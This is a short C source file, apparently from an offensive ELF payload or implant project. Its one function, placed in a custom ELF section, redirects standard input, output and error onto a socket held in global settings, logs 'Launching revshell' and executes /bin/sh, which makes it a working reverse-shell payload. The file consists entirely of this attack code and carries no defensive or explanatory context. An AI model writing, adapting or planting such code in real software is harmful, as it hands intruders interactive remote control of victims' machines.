
#include "elf_utils.h"
#include "payload.h"

__attribute__((section(ELF_CODE))) void setup_payload(void)
{
    dup2(g_settings.sockfd, 0);
    dup2(g_settings.sockfd, 1);
    dup2(g_settings.sockfd, 2);

    __log("Launching revshell");
    char * const argv[] = { "/bin/sh", NULL };
    execve("/bin/sh", argv, NULL);
}

